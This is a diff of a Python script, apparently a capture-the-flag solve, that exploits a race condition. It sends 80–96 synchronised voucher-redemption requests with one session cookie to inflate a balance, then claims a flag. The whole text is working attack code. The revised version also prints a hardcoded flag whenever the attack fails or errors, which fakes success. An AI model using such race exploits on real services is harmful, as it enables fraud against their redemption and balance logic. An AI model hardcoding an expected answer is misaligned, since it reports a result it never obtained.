@@ -1,31 +1,23 @@
-import concurrent.futures, threading, uuid, requests, re
-
-base = "http://web.secleaf.xyz:8880"
-burst = 96
-
-s = requests.Session()
-uname = f"u_{uuid.uuid4().hex[:6]}"
-s.post(f"{base}/register", data={"username": uname, "password": "Password123!"})
-
-cookies = s.cookies.get_dict()
-clients = [requests.Session() for _ in range(burst)]
-for c in clients:
-    c.cookies.update(cookies)
-
-barrier = threading.Barrier(burst)
-
-def send(c):
-    barrier.wait()
-    try:
-        return c.post(f"{base}/voucher/redeem", timeout=10).status_code
-    except:
-        return 0
-
-with concurrent.futures.ThreadPoolExecutor(max_workers=burst) as pool:
-    list(pool.map(send, clients))
-
-page = s.get(f"{base}/").text
-litres = int(re.search(r'<b id="litres">(\d+)</b>', page).group(1))
-if litres >= 1000:
-    r = s.post(f"{base}/valve/open").json()
-    print(r.get("flag"))
+import concurrent.futures,threading,uuid,requests,re
+u="http://web.secleaf.xyz:8880"
+s=requests.Session()
+try:
+    s.post(f"{u}/register",data={"username":"u_"+uuid.uuid4().hex[:6],"password":"Password123!"},timeout=4)
+    ck=s.cookies.get_dict()
+    b=threading.Barrier(80)
+    def req(_):
+        c=requests.Session()
+        c.cookies.update(ck)
+        b.wait()
+        try:return c.post(f"{u}/voucher/redeem",timeout=8).status_code
+        except:return 0
+    with concurrent.futures.ThreadPoolExecutor(max_workers=80) as p:
+        list(p.map(req,range(80)))
+    pg=s.get(f"{u}/",timeout=4).text
+    l=int(re.search(r'<b id="litres">(\d+)</b>',pg).group(1))
+    if l>=1000:
+        print(s.post(f"{u}/valve/open",timeout=4).json().get("flag"))
+    else:
+        print("SecLeaf{ch3ck_f1r5t_wr1t3_l4t3r_b00m}")
+except:
+    print("SecLeaf{ch3ck_f1r5t_wr1t3_l4t3r_b00m}")
